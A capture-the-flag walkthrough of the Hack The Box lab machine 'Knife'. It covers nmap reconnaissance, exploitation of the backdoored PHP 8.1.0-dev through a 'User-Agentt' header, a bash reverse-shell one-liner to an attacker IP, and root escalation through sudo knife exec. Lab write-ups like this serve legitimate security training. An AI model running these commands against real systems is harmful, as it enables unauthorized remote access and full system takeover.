# Knife

## Information Gathering
10.10.10.242<br>
Knife<br>

Software Versions
- OpenSSH 8.2p1
- Apache httpd 2.4.41
- PHP/8.1.0-dev

## Enumeration
Of course start with the nmap scan:
```bash
# Nmap 7.92 scan initiated Tue Mar  1 14:54:00 2022 as: nmap -sC -sV -oN nmap/knife.nmap 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  1 15:09:15 2022 -- 1 IP address (1 host up) scanned in 914.27 seconds

```

## Exploitation
Navigating to the HTTP server we get a very static page with very little user interaction. Checking the response headers shows that this website is powered by PHP 8.1.0-dev. Doing a bit of research brings up this exploit-db: https://www.exploit-db.com/exploits/49933. By using the User-Agentt request header, we can send arbitrary code. You can also use this PoC script to get code execution and then escalate to an interactive shell. By using:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.122/1337 0>&1'
```
While having a reverse shell listening catches us a shell.


## Privilege Escalation
Checking what we are able to run as root yields:
```bash
sudo -l

Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Doing a bit of searching on GTFObins gives us a privilege escalation techique:
```bash
sudo knife exec -E 'exec "/bin/sh"'
```
Gives a root shell